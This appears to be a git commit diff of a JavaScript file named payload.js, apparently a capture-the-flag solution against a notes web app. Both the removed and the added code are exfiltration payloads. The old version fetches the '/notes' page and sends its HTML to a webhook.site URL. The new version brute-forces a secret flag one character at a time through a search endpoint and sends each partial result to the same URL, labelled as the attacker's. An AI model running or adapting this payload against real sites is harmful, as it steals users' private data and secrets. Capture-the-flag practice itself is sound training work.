78f688f4150fd8e44ebc6d1708cb15efef552956
Axl <bryannicholas7@gmail.com>
2025-06-20 23:28:20 +0700

    payload

--- payload.js
+++ payload.js
@@ -1,4 +1,24 @@
-const html_steal = await fetch('/notes')
-const html = await html_steal.text();
-const haha = await fetch('https://webhook.site/6468aa73-bdef-4ec4-b802-e0d5084b9da6?data='+ html);
-console.log(haha.status);
+let flag = 'PETIR{'
+const attackerUrl = 'https://webhook.site/6468aa73-bdef-4ec4-b802-e0d5084b9da6'
+const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789}_'
+
+async function exploit() {
+	while (flag[flag.length - 1] !== '}') {
+		let found = false
+		for (const char of charset) {
+			console.log(`trying ${char}`)
+			const res = await fetch(`/notes/search?q=${flag + char}`)
+			if (res.ok) {
+				flag += char
+				found = true
+				fetch(`${attackerUrl}?flag=${flag}`)
+				break
+			}
+		}
+		if (!found) {
+			break
+		}
+	}
+}
+
+exploit()
